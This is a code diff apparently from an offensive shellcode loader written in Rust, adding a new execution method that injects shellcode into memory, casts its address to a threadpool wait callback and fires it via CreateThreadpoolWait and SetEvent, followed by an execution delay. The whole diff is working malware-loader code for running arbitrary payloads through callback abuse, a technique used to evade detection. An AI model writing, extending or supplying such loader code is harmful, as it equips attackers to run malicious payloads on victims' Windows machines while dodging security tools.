@@ -1729,3 +1729,70 @@ pub fn shellcode_execute_enumsystemgeoid(bytes_to_load: Vec<u8>) -> bool {
         Err(_) => false,
     }
 }
+// =======================================================================================================
+// EXECUTION METHOD: ThreadpoolWait (PTP_WAIT_CALLBACK)
+// =======================================================================================================
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+use windows_sys::Win32::Foundation::CloseHandle;
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+use windows_sys::Win32::System::Threading::{
+    CreateEventW, CreateThreadpoolWait, SetEvent, SetThreadpoolWait, WaitForThreadpoolWaitCallbacks
+};
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+fn exec_payload_via_callback_func_threadpoolwait(start_address: *mut c_void) -> Result<(), String> {
+    use std::ptr::{null, null_mut};
+    
+    // Create event for threadpool wait
+    let event = unsafe { CreateEventW(null_mut(), 0, 0, null()) };
+    
+    if event.is_null() {
+        return Err(String::from(""));
+    }
+    
+    // Cast shellcode address to PTP_WAIT_CALLBACK
+    let callback = unsafe { Some(std::mem::transmute(start_address)) };
+    
+    // Create threadpool wait object with shellcode as callback
+    let ptp_wait = unsafe { CreateThreadpoolWait(callback, null_mut(), null_mut()) };
+    
+    if ptp_wait == 0 {
+        unsafe { CloseHandle(event) };
+        return Err(String::from(""));
+    }
+    
+    // Set the wait object with the event
+    unsafe { SetThreadpoolWait(ptp_wait, event, null()) };
+    
+    // Trigger the event to execute callback
+    unsafe { SetEvent(event) };
+    
+    // Wait for callback to complete
+    unsafe { WaitForThreadpoolWaitCallbacks(ptp_wait, 0) };
+    
+    // Cleanup
+    unsafe { CloseHandle(event) };
+    
+    Ok(())
+}
+
+#[cfg(feature = "ShellcodeExecuteThreadpoolWait")]
+pub fn shellcode_execute_threadpoolwait(bytes_to_load: Vec<u8>) -> bool {
+    match inject_shellcode(&bytes_to_load) {
+        Ok(base_address) => {
+            match exec_payload_via_callback_func_threadpoolwait(base_address) {
+                Ok(_) => {
+                    // Sleep to allow callback execution
+                    unsafe {
+                        delay_execution();
+                    }
+                    true
+                }
+                Err(_) => false,
+            }
+        }
+        Err(_) => false,
+    }
+}
